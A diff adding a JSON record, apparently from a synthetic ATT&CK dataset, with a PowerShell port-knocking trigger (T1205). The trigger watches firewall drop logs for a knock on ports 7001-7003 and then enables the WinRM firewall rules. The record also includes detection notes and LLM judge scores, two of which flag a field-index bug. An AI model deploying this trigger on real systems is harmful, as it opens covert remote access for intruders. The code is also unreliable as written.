@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "& netsh advfirewall set currentprofile logging droppedconnections enable;$log=\"$env:SystemRoot\\System32\\LogFiles\\Firewall\\pfirewall.log\";$seq=@(7001,7002,7003);$state=@{};Get-Content $log -Wait | Where-Object {$_ -and ($_ -notmatch '^#')} | ForEach-Object{ $f=$_ -split '\\s+'; if($f.Length -ge 9 -and $f[2] -eq 'DROP'){ $src=$f[4]; $dstPort=[int]$f[8]; $idx=[array]::IndexOf($seq,$dstPort); if($idx -ge 0 -and ( ($idx -eq 0) -or ($state[$src] -eq ($idx-1)) )){ $state[$src]=$idx; if($state[$src] -eq ($seq.Count-1)){ & netsh advfirewall firewall set rule group=\"Windows Remote Management\" new enable=yes; break } } } }",
+  "explanation": "Enables Windows Firewall dropped-packet logging, tails the log for a specific three-port knock sequence (UDP to 7001/7002/7003) from the same source, then enables the 'Windows Remote Management' firewall group via netsh. Requires Administrator.",
+  "rationale_steps": [
+    "Turn on firewall drop logging and stream the log in real time.",
+    "Parse for a specific destination port sequence from a single IP to act as a covert trigger.",
+    "Detection: monitor changes to firewall logging settings, tailing of pfirewall.log by suspicious processes, and WinRM firewall group state transitions (Event IDs 4946-4951)."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-3c835ea5-3a33ff40",
+  "source_prompt_hash": "3c835ea5",
+  "timestamp_utc": "2025-09-30T05:43:16.300607Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell command is well-formed with balanced braces, valid piping, and correctly quoted netsh arguments.",
+        "semantic_score": 3,
+        "semantic_justification": "Conceptually aligns with Traffic Signaling via port-knock detection and trigger, but it indexes the firewall log's size field instead of destination port (uses f[8] instead of f[7]) and doesn't enforce UDP, making the trigger unlikely to work as described.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T18:09:52.939286Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed PowerShell with balanced braces, valid pipeline operators, and correct string escaping, though the leading '& ' before netsh is unnecessary and the escaped backslashes in the log path (\\s+, \\\\) mix regex and string contexts that could cause edge-case issues.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements a port-knock sequence detector (T1205) by enabling firewall drop logging, tailing the log file, parsing DROP entries for a stateful three-port sequence (7001→7002→7003) per source IP, and triggering WinRM firewall rule enablement upon successful knock completion, which is a textbook traffic signaling trigger mechanism.",
+        "combined_score": 4.5,
+        "confidence": 0.88,
+        "timestamp": "2026-02-19T04:04:50.554010Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is a well-formed PowerShell script utilizing valid syntax for variable assignment, array and hash table manipulation, and pipeline processing with Get-Content and ForEach-Object.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively implements a port-knocking trigger by monitoring firewall logs for dropped packets, which is a classic implementation of Traffic Signaling (T1205). However, in the standard Windows Firewall log format, the destination port is at index 7, while the script attempts to read the port from index 8 (which is the packet size field).",
+        "combined_score": 4.5,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T04:05:11.239681Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
